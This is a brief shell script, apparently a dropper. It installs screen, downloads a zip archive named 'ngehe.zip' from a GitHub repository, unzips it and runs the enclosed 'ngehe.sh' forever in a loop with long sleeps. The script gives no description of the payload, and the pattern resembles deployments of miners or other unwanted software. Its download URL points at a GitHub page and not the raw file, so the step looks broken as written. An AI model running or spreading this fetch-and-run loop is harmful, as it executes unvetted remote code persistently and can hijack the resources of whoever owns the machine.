#!/bin/sh
sudo apt update -y
sudo apt install screen -y
sudo screen -dmS random
wget https://github.com/dik4prat4/main/blob/main/ngehe.zip && unzip ngehe.zip
chmod +x ngehe.sh
while [ 1 ]; do
./ngehe.sh
sleep 6969
done
sleep 6969
